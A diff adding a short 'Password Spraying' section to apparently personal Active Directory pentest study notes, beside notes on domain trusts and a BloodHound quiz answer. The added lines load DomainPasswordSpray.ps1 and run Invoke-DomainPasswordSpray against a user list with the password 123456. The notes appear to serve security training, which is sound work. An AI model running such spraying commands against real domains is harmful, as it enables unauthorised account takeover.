@@ -59,6 +59,12 @@ Trust  - Trust provides a mechanism for users to access resources in another dom
 *** All domains in a forest trust all other domains in the forest ***
     Trust can extend outside the forest
 _______________________________________________________________________________________________________________________________________________________________________________________________
+Password Spraying
+-----------------
+C:> cd C:\Tools\Scripts\Credentials
+C:> . .\DomainPasswordSpray.ps1
+C:> Invoke-DomainPasswordSpray -UserList C:\Tools\Users.txt -Password 123456 -Verbose
+_______________________________________________________________________________________________________________________________________________________________________________________________
 Bloodhouund
 -----------
 Which of the following Active Directory objects can BloodHound help identify? > Groups with excessive permissions
